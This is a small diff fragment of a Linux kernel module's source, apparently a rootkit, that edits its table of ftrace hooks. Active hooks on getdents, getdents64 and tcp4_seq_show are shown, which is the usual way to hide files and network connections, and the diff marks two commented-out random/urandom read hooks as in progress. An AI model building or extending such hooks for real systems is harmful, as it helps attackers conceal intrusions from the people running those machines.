@@ -18,8 +18,8 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-    //HOOK("random_read_iter", hook_random_read, &orig_random_read),
-    //HOOK("urandom_read_iter", hook_urandom_read, &orig_urandom_read),
+    //HOOK("random_read_iter", hook_random_read, &orig_random_read),   IN PROGRESS
+    //HOOK("urandom_read_iter", hook_urandom_read, &orig_urandom_read),    IN PROGRESS
 };
 
 static int __init lkm_init(void) {
